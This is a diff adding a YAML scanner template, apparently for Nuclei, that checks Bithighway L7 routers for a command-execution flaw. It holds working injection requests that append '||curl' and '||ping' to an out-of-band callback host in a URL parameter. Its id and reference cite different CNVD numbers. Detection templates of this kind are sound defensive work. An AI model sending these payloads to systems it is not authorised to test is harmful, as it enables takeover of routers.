@@ -1,0 +1,37 @@
+id: bithighway-l7-rce-cnvd-2021-41531
+
+info:
+  name: Bithighway L7 RCE (CNVD-2021-41531)
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Bihaiwei L7 cloud router wireless operation version has command execution vulnerabilities. An attacker can use this vulnerability to gain control of the server.
+  tags: rce
+  reference:
+    - https://www.cnvd.org.cn/flaw/show/CNVD-2021-37007
+
+variables:
+  check_str: "{{rand_base(4)}}"
+  check_url: "{{interactsh-url}}"
+
+http:
+  - raw:
+      - |
+        GET /notice/confirm.php?t=||curl%20{{check_url}} HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /notice/confirm.php?t=||ping%20{{check_url}} HTTP/1.1
+        Host: {{Hostname}}
+
+    stop-at-first-match: true
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
